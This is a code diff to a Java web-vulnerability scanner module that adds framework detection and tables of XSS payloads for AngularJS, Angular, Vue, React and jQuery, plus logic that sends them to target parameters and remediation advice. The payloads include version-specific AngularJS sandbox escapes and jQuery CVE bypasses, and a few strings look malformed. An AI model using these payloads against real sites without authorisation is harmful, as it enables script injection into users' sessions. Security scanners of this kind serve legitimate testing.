@@ -13,7 +13,7 @@ import com.omnistrike.model.*;
 import java.net.URLEncoder;
 import java.nio.charset.StandardCharsets;
 import java.util.*;
-
+import java.util.concurrent.ConcurrentHashMap;
 import java.util.concurrent.atomic.AtomicReference;
 import java.util.regex.Matcher;
 import java.util.regex.Pattern;
@@ -30,6 +30,9 @@ public class XssScanner implements ScanModule {
     private DeduplicationStore dedup;
     private FindingsStore findingsStore;
     private CollaboratorManager collaboratorManager;
+
+    // Framework detection cache: host → set of detected framework names
+    private final ConcurrentHashMap<String, Set<String>> frameworkCachePerHost = new ConcurrentHashMap<>();
 
     // ==================== DOM XSS: SOURCES, SINKS, PATTERNS ====================
 
@@ -296,6 +299,116 @@ public class XssScanner implements ScanModule {
             {"<input type=hidden onfocus=alert(1) autofocus>", "onfocus=alert", "Hidden input autofocus"},
             {"<body background=javascript:alert(1)>", "javascript:", "Body background scheme (legacy)"},
             {"<link rel=import href=data:text/html,<script>alert(1)</script>>", "<script>alert", "HTML import data scheme"},
+    };
+
+    // ==================== FRAMEWORK-SPECIFIC XSS PAYLOADS ====================
+
+    // AngularJS (1.x) payloads — sandbox escapes and expression injection
+    private static final String[][] ANGULARJS_PAYLOADS = {
+            {"{{7*7}}", "49", "AngularJS basic expression evaluation"},
+            {"{{constructor.constructor('alert(1)')()}}", "alert(1)", "AngularJS sandbox escape (1.2.0-1.2.1)"},
+            {"{{a='constructor';b={};a.sub.call.call(b[a].getOwnPropertyDescriptor(b[a].getPrototypeOf(a.sub),a).value,0,'alert(1)')()}}", "alert(1)", "AngularJS sandbox escape (1.2.2-1.2.5)"},
+            {"{{'a'.constructor.prototype.charAt=[].join;$eval('x=alert(1)')}}", "alert(1)", "AngularJS sandbox escape (1.2.6-1.2.18)"},
+            {"{{toString.constructor.prototype.toString=toString.constructor.prototype.call;[\"a\",\"alert(1)\"].sort(toString.constructor)}}", "alert(1)", "AngularJS sandbox escape (1.2.19-1.2.23)"},
+            {"{{'a'.constructor.prototype.charAt=''.concat;$eval('x=alert(1)')}}", "alert(1)", "AngularJS sandbox escape (1.2.24-1.2.29)"},
+            {"{{!ready&&(ready=true)&&(a]constructor.prototype.charAt=[].join;$eval('x=alert(1)'))}}", "alert(1)", "AngularJS sandbox escape (1.3.0)"},
+            {"{{toString().constructor.prototype.charAt=[].join;$eval('x=alert(1)')}}", "alert(1)", "AngularJS sandbox escape (1.3.1-1.3.2)"},
+            {"{{{}[{toString:[].join,length:1,0:'__proto__'}].assign=[].join;'a]constructor.prototype.charAt='[].join;$eval('x=alert(1)')//'}}", "alert(1)", "AngularJS sandbox escape (1.3.3-1.3.18)"},
+            {"{{toString().constructor.prototype.charAt=[].join;$eval('x=alert(1)')}}", "alert(1)", "AngularJS sandbox escape (1.4.0-1.4.9)"},
+            {"{{x={'y':''.constructor.prototype};x['y'].charAt=[].join;$eval('x=alert(1)');}}", "alert(1)", "AngularJS sandbox escape (1.5.0-1.5.7)"},
+            {"{{'a'.constructor.prototype.charAt=[].join;$eval('x=alert(1)')}}", "alert(1)", "AngularJS sandbox escape (1.5.8-1.5.9)"},
+            // AngularJS >= 1.6 (no sandbox)
+            {"{{constructor.constructor('alert(1)')()}}", "alert(1)", "AngularJS >=1.6 constructor chain"},
+            {"{{$on.constructor('alert(1)')()}}", "alert(1)", "AngularJS >=1.6 $on.constructor"},
+            {"{{$eval.constructor('alert(1)')()}}", "alert(1)", "AngularJS >=1.6 $eval.constructor"},
+            // Special AngularJS sinks
+            {"<div ng-bind-html-unsafe=\"'<img src=x onerror=alert(1)>'\"></div>", "onerror=alert", "AngularJS ng-bind-html-unsafe"},
+            {"{{$sce.trustAsHtml('<img src=x onerror=alert(1)>')}}", "onerror=alert", "AngularJS $sce bypass"},
+            {"{{orderBy:[].constructor.from('alert(1)',decodeURI)}}", "alert(1)", "AngularJS orderBy filter exploit"},
+    };
+
+    // Angular (2+) payloads — template injection and DomSanitizer bypass
+    private static final String[][] ANGULAR_PAYLOADS = {
+            {"{{7*7}}", "49", "Angular server-composed template expression"},
+            {"<img src=x onerror=alert(1)>", "onerror=alert", "Angular DomSanitizer bypass — img onerror"},
+            {"<svg onload=alert(1)>", "onload=alert", "Angular DomSanitizer bypass — svg onload"},
+            {"<div [innerHTML]=\"'<img src=x onerror=alert(1)>'\"></div>", "onerror=alert", "Angular [innerHTML] binding"},
+            {"${7*7}", "49", "Angular SSR template injection (ES template literal)"},
+            {"<%- 7*7 %>", "49", "Angular SSR template injection (EJS)"},
+            {"javascript:alert(1)", "javascript:alert", "Angular href/src javascript: scheme"},
+            {"<a [href]=\"'javascript:alert(1)'\">click</a>", "javascript:alert", "Angular [href] binding javascript:"},
+            {"<iframe [src]=\"'javascript:alert(1)'\"></iframe>", "javascript:alert", "Angular [src] binding javascript:"},
+    };
+
+    // Vue.js payloads — template injection and v-html exploitation
+    private static final String[][] VUE_PAYLOADS = {
+            {"{{7*7}}", "49", "Vue template expression evaluation"},
+            {"{{constructor.constructor('alert(1)')()}}", "alert(1)", "Vue constructor chain"},
+            {"{{_c.constructor('alert(1)')()}}", "alert(1)", "Vue _c constructor"},
+            {"{{_v.constructor('alert(1)')()}}", "alert(1)", "Vue _v constructor"},
+            {"{{this.constructor.constructor('alert(1)')()}}", "alert(1)", "Vue this.constructor chain"},
+            {"{{$el.ownerDocument.defaultView.alert(1)}}", "alert(1)", "Vue $el.ownerDocument"},
+            // Vue 3 specific
+            {"{{$emit.constructor('alert(1)')()}}", "alert(1)", "Vue 3 $emit.constructor"},
+            {"{{$nextTick.constructor('alert(1)')()}}", "alert(1)", "Vue 3 $nextTick.constructor"},
+            {"{{_openBlock.constructor('alert(1)')()}}", "alert(1)", "Vue 3 _openBlock.constructor"},
+            // v-html exploitation
+            {"<div v-html=\"'<img src=x onerror=alert(1)>'\"></div>", "onerror=alert", "Vue v-html img onerror"},
+            {"<div v-html=\"'<svg onload=alert(1)>'\"></div>", "onload=alert", "Vue v-html svg onload"},
+            {"<div v-html=\"'<iframe src=javascript:alert(1)>'\"></div>", "javascript:alert", "Vue v-html iframe javascript:"},
+            // v-bind href
+            {"<a v-bind:href=\"'javascript:alert(1)'\">click</a>", "javascript:alert", "Vue v-bind:href javascript:"},
+            // SSR hydration mismatch
+            {"<div id=app>{{constructor.constructor('alert(1)')()}}</div>", "alert(1)", "Vue SSR hydration mismatch"},
+            {"<template>{{_c.constructor('alert(1)')()}}</template>", "alert(1)", "Vue template tag injection"},
+    };
+
+    // React payloads — dangerouslySetInnerHTML and href javascript:
+    private static final String[][] REACT_PAYLOADS = {
+            // dangerouslySetInnerHTML exploitation
+            {"<img src=x onerror=alert(1)>", "onerror=alert", "React dangerouslySetInnerHTML — img onerror"},
+            {"<svg onload=alert(1)>", "onload=alert", "React dangerouslySetInnerHTML — svg onload"},
+            {"<details open ontoggle=alert(1)>", "ontoggle=alert", "React dangerouslySetInnerHTML — details ontoggle"},
+            {"<math><mtext><table><mglyph><svg><mtext><style><path id=\"</style><img src=x onerror=alert(1)>\">", "onerror=alert", "React dangerouslySetInnerHTML — mutation XSS"},
+            // href javascript: scheme (React allows in <a> tags)
+            {"javascript:alert(1)", "javascript:alert", "React href javascript: scheme"},
+            {"javascript:alert(document.domain)", "javascript:alert", "React href javascript: domain leak"},
+            // SSR hydration mismatch (Next.js / Remix)
+            {"<div data-reactroot=\"\"><img src=x onerror=alert(1)></div>", "onerror=alert", "React SSR hydration mismatch"},
+            {"<script>__NEXT_DATA__={props:{pageProps:{dangerousHtml:'<img src=x onerror=alert(1)>'}}}</script>", "onerror=alert", "Next.js __NEXT_DATA__ injection"},
+            // Prototype pollution → dangerouslySetInnerHTML
+            {"__proto__[dangerouslySetInnerHTML][__html]=<img src=x onerror=alert(1)>", "onerror=alert", "React prototype pollution → dangerouslySetInnerHTML"},
+            // Next.js image src injection
+            {"/_next/image?url=javascript:alert(1)&w=128&q=75", "javascript:alert", "Next.js image src injection"},
+            {"<div dangerouslySetInnerHTML={{__html:'<img src=x onerror=alert(1)>'}}></div>", "onerror=alert", "React dangerouslySetInnerHTML direct"},
+            {"<a href=\"javascript:alert(1)\">click</a>", "javascript:alert", "React anchor href javascript:"},
+    };
+
+    // jQuery payloads — .html() sinks, selector injection, and CVEs
+    private static final String[][] JQUERY_PAYLOADS = {
+            // .html() sink exploitation
+            {"<img src=x onerror=alert(1)>", "onerror=alert", "jQuery .html() sink — img onerror"},
+            {"<svg onload=alert(1)>", "onload=alert", "jQuery .html() sink — svg onload"},
+            // Selector injection
+            {"#<img src=x onerror=alert(1)>", "onerror=alert", "jQuery selector injection — hash prefix"},
+            {"<img src=x onerror=alert(1)>", "onerror=alert", "jQuery $() HTML creation"},
+            // $.parseHTML with keepScripts
+            {"<script>alert(1)</script>", "<script>alert(1)</script>", "jQuery $.parseHTML keepScripts"},
+            // Event handler injection via .attr()
+            {"\" onfocus=\"alert(1)\" autofocus=\"", "onfocus", "jQuery .attr() event handler injection"},
+            // $.globalEval
+            {"alert(1)", "alert(1)", "jQuery $.globalEval test"},
+            // AJAX response HTML injection
+            {"<div><img src=x onerror=alert(1)></div>", "onerror=alert", "jQuery AJAX response HTML injection"},
+            // jQuery < 3.0 selector XSS (CVE-2012-6708)
+            {"<img src=x onerror=alert(1) id=x>", "onerror=alert", "jQuery <3.0 selector XSS (CVE-2012-6708)"},
+            {"#<img src=x:x onerror=alert(1)//>", "onerror=alert", "jQuery <3.0 hash selector XSS"},
+            // jQuery 3.x htmlPrefilter bypass (CVE-2020-11023)
+            {"<option><style></option></select><img src=x onerror=alert(1)></style>", "onerror=alert", "jQuery 3.x htmlPrefilter bypass (CVE-2020-11023)"},
+            {"<style><style/><img src=x onerror=alert(1)>", "onerror=alert", "jQuery htmlPrefilter style tag bypass"},
+            // .wrap()/.replaceWith() event handler injection
+            {"<div onmouseover=alert(1)>hover</div>", "onmouseover=alert", "jQuery .wrap() event handler injection"},
+            {"<form><button formaction=javascript:alert(1)>click</button></form>", "javascript:alert", "jQuery .replaceWith() formaction injection"},
     };
 
     @Override
@@ -1718,6 +1831,10 @@ public class XssScanner implements ScanModule {
         String context = identifyContext(canaryBody, CANARY);
         api.logging().logToOutput("[XSS] Reflection found for param '" + target.name + "' in context: " + context);
 
+        // Detect frontend frameworks for targeted payloads later
+        Set<String> detectedFrameworks = config.getBool("xss.frameworkXss.enabled", true)
+                ? detectFrameworks(canaryResult) : Collections.emptySet();
+
         findingsStore.addFinding(Finding.builder("xss-scanner",
                         "XSS: Input reflected in " + context + " context",
                         Severity.INFO, Confidence.CERTAIN)
@@ -1800,6 +1917,11 @@ public class XssScanner implements ScanModule {
         // Step 6: Client-side template injection (Improvement 2)
         if (config.getBool("xss.csti.enabled", true)) {
             testTemplateInjection(original, target, url);
+        }
+
+        // Step 6.5: Framework-specific XSS payloads
+        if (config.getBool("xss.frameworkXss.enabled", true) && !detectedFrameworks.isEmpty()) {
+            testFrameworkSpecificXss(original, target, url, detectedFrameworks, charSurvival);
         }
 
         // Step 7: Encoding negotiation XSS (Improvement 6)
@@ -1950,6 +2072,222 @@ public class XssScanner implements ScanModule {
                         .build());
             }
             perHostDelay();
+        }
+    }
+
+    // ==================== FRAMEWORK-SPECIFIC XSS TESTING ====================
+
+    /**
+     * Detects frontend frameworks present in the response body/headers. Cached per host.
+     */
+    private Set<String> detectFrameworks(HttpRequestResponse response) {
+        String host = extractHost(response.request().url());
+        if (frameworkCachePerHost.containsKey(host)) {
+            return frameworkCachePerHost.get(host);
+        }
+
+        Set<String> frameworks = new LinkedHashSet<>();
+        String body = "";
+        try {
+            if (response.response() != null) {
+                body = response.response().bodyToString();
+            }
+        } catch (Exception e) {
+            // If body can't be read, return empty
+        }
+        if (body == null) body = "";
+
+        // Also check response headers (e.g., X-Powered-By, Server)
+        String allHeaders = "";
+        if (response.response() != null) {
+            StringBuilder hb = new StringBuilder();
+            for (var h : response.response().headers()) {
+                hb.append(h.name()).append(": ").append(h.value()).append("\n");
+            }
+            allHeaders = hb.toString();
+        }
+        String combined = body + "\n" + allHeaders;
+
+        // AngularJS (1.x) — must check BEFORE Angular (2+) since Angular also uses 'ng-'
+        boolean hasAngularModern = containsAny(combined, "ng-version=", "_nghost-", "_ngcontent-",
+                "@angular/core", "ng-star-inserted");
+        boolean hasAngularJS = containsAny(combined, "ng-app", "ng-controller", "angular.module",
+                "angular.min.js", "$scope");
+
+        if (hasAngularJS && !hasAngularModern) {
+            frameworks.add("ANGULARJS");
+        }
+        if (hasAngularModern) {
+            frameworks.add("ANGULAR");
+        }
+
+        // Vue.js
+        if (containsAny(combined, "v-cloak", "data-v-", "Vue.createApp", "vue.min.js",
+                "v-bind:", "v-on:", "v-model")) {
+            frameworks.add("VUE");
+        }
+
+        // React / Next.js
+        if (containsAny(combined, "data-reactroot", "__NEXT_DATA__", "_reactRootContainer",
+                "react.production.min.js", "ReactDOM.render")) {
+            frameworks.add("REACT");
+        }
+
+        // jQuery
+        if (containsAny(combined, "jQuery", "jquery.min.js", "$.fn.", "$(document).ready")) {
+            frameworks.add("JQUERY");
+        }
+
+        frameworkCachePerHost.put(host, frameworks);
+        api.logging().logToOutput("[XSS] Framework detection for host " + host + ": " + frameworks);
+        return frameworks;
+    }
+
+    /**
+     * Extracts host from a URL string.
+     */
+    private String extractHost(String url) {
+        try {
+            if (url.contains("://")) {
+                String afterScheme = url.substring(url.indexOf("://") + 3);
+                int slashIdx = afterScheme.indexOf('/');
+                return slashIdx >= 0 ? afterScheme.substring(0, slashIdx) : afterScheme;
+            }
+        } catch (Exception ignored) {}
+        return url;
+    }
+
+    /**
+     * Returns true if the text contains any of the given markers (case-sensitive).
+     */
+    private boolean containsAny(String text, String... markers) {
+        for (String m : markers) {
+            if (text.contains(m)) return true;
+        }
+        return false;
+    }
+
+    /**
+     * Tests framework-specific XSS payloads based on detected frameworks.
+     * Respects character survival filtering and reports findings with framework context.
+     */
+    private void testFrameworkSpecificXss(HttpRequestResponse original, XssTarget target,
+                                           String url, Set<String> frameworks,
+                                           Map<Character, Boolean> charSurvival) throws InterruptedException {
+        // Map framework names to their payload arrays
+        Map<String, String[][]> frameworkPayloads = new LinkedHashMap<>();
+        for (String fw : frameworks) {
+            switch (fw) {
+                case "ANGULARJS": frameworkPayloads.put("AngularJS", ANGULARJS_PAYLOADS); break;
+                case "ANGULAR":   frameworkPayloads.put("Angular", ANGULAR_PAYLOADS); break;
+                case "VUE":       frameworkPayloads.put("Vue.js", VUE_PAYLOADS); break;
+                case "REACT":     frameworkPayloads.put("React", REACT_PAYLOADS); break;
+                case "JQUERY":    frameworkPayloads.put("jQuery", JQUERY_PAYLOADS); break;
+            }
+        }
+
+        for (Map.Entry<String, String[][]> entry : frameworkPayloads.entrySet()) {
+            String fwName = entry.getKey();
+            String[][] payloads = entry.getValue();
+
+            api.logging().logToOutput("[XSS] Testing " + payloads.length + " " + fwName
+                    + " payloads for param '" + target.name + "'");
+
+            for (String[] payload : payloads) {
+                String xssPayload = payload[0];
+                String checkFor = payload[1];
+                String desc = payload[2];
+
+                // Skip payloads that use blocked characters
+                if (!payloadViableWithChars(xssPayload, charSurvival)) {
+                    continue;
+                }
+
+                HttpRequestResponse result = sendPayload(original, target, xssPayload);
+                if (result == null || result.response() == null) continue;
+
+                String body = result.response().bodyToString();
+
+                // For template expression probes ({{7*7}}, ${7*7}): check evaluation
+                boolean isTemplateProbe = xssPayload.contains("{{7*7}}") || xssPayload.contains("${7*7}")
+                        || xssPayload.contains("<%- 7*7 %>");
+                if (isTemplateProbe) {
+                    boolean resultPresent = body.contains(checkFor); // e.g., "49"
+                    // Check if the template syntax was consumed (not reflected raw)
+                    String syntaxMarker = xssPayload.length() > 6 ? xssPayload.substring(0, 4) : xssPayload;
+                    boolean syntaxPresent = body.contains(xssPayload);
+
+                    if (resultPresent && !syntaxPresent) {
+                        findingsStore.addFinding(Finding.builder("xss-scanner",
+                                        "Framework XSS: " + fwName + " — " + desc,
+                                        Severity.HIGH, Confidence.FIRM)
+                                .url(url).parameter(target.name)
+                                .evidence("Payload: " + xssPayload + " | Evaluated to: " + checkFor
+                                        + " | Framework: " + fwName)
+                                .description("Framework-specific XSS detected via " + desc + ". "
+                                        + "The template expression was evaluated by the " + fwName
+                                        + " framework, confirming client-side template injection.")
+                                .remediation(getFrameworkRemediation(fwName))
+                                .requestResponse(result)
+                                .build());
+                        return; // Confirmed XSS for this param
+                    }
+                } else {
+                    // For HTML/JS payloads: check if checkFor marker is present
+                    if (!checkFor.isEmpty() && body.contains(checkFor)) {
+                        findingsStore.addFinding(Finding.builder("xss-scanner",
+                                        "Framework XSS: " + fwName + " — " + desc,
+                                        Severity.HIGH, Confidence.FIRM)
+                                .url(url).parameter(target.name)
+                                .evidence("Payload: " + xssPayload + " | Marker '" + checkFor
+                                        + "' found in response | Framework: " + fwName)
+                                .description("Framework-specific XSS detected via " + desc + ". "
+                                        + "The payload exploits " + fwName + "-specific behavior. "
+                                        + "The marker '" + checkFor + "' was found in the response body.")
+                                .remediation(getFrameworkRemediation(fwName))
+                                .requestResponse(result)
+                                .build());
+                        return; // Confirmed XSS for this param
+                    }
+                }
+                perHostDelay();
+            }
+        }
+    }
+
+    /**
+     * Returns framework-specific remediation text.
+     */
+    private String getFrameworkRemediation(String framework) {
+        switch (framework) {
+            case "AngularJS":
+                return "Upgrade from AngularJS (1.x) to Angular (2+) which does not have a client-side sandbox. "
+                        + "If upgrading is not possible, avoid injecting user input into AngularJS template expressions. "
+                        + "Use ng-bind instead of {{ }} interpolation. Implement Content Security Policy (CSP) "
+                        + "with strict-dynamic. Remove ng-bind-html-unsafe usage and ensure $sce is enabled.";
+            case "Angular":
+                return "Never bypass Angular's DomSanitizer (avoid bypassSecurityTrustHtml/Script/Url). "
+                        + "Do not use server-side composition of Angular templates with user input. "
+                        + "Use [textContent] instead of [innerHTML] where possible. Implement strict CSP headers. "
+                        + "Validate and sanitize all URL bindings to prevent javascript: scheme injection.";
+            case "Vue.js":
+                return "Avoid using v-html with user-controlled data. Use {{ }} text interpolation (auto-escaped) "
+                        + "instead. Never compile user input as Vue templates (no new Vue({ template: userInput })). "
+                        + "Use v-text or v-bind with proper sanitization. Implement Content Security Policy. "
+                        + "For Vue 3, ensure template compilation is not available in production builds.";
+            case "React":
+                return "Never pass user input to dangerouslySetInnerHTML. Sanitize all HTML content with DOMPurify "
+                        + "before rendering. Validate href/src attributes to prevent javascript: scheme injection. "
+                        + "Use React's built-in JSX escaping for text content. For Next.js, validate all server-side "
+                        + "props and avoid exposing sensitive data in __NEXT_DATA__. Implement strict CSP headers.";
+            case "jQuery":
+                return "Upgrade jQuery to version 3.5.0+ to mitigate known XSS CVEs (CVE-2012-6708, CVE-2020-11023). "
+                        + "Avoid using .html(), .append(), .prepend() with user-controlled data. Use .text() for "
+                        + "text content. Never pass user input to $() selector — use .find() on a known container. "
+                        + "Sanitize HTML with DOMPurify before using $.parseHTML(). Avoid $.globalEval().";
+            default:
+                return "Sanitize all user input before rendering in the framework. Implement Content Security Policy. "
+                        + "Use framework-provided safe APIs for rendering user content.";
         }
     }
 
@@ -2482,7 +2820,9 @@ public class XssScanner implements ScanModule {
     }
 
     @Override
-    public void destroy() { }
+    public void destroy() {
+        frameworkCachePerHost.clear();
+    }
 
     private enum XssTargetType { QUERY, BODY, COOKIE, JSON, HEADER, PATH }
 
